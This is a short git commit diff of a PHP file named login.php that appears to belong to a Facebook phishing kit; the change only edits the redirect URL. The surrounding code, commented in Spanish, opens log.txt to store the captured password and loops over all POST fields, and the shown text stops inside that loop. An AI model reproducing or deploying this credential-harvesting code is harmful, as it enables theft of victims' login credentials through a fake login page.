377ba7ef79d44e3c8c38ca4e34fd3b0f679bea57
JeanPertuza21 <96665390+JeanPertuza21@users.noreply.github.com>
2021-12-25 15:06:50 -0500

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 	//@Naiv_Sec&Inf
-	header ('Location: https://www.facebook.com/ '); //La URL a redireccionar tiene que estar luego de Location:
+	header ('Location:http://www.facebook.com'); //La URL a redireccionar tiene que estar luego de Location:
 	$handle = fopen("log.txt", "a"); //Aquí se abre el archivo donde se va a guardar la contraseña
 	//A partír de aquí se escriben las variables que obtiene luego del POST
 	foreach($_POST as $variable => $value) {
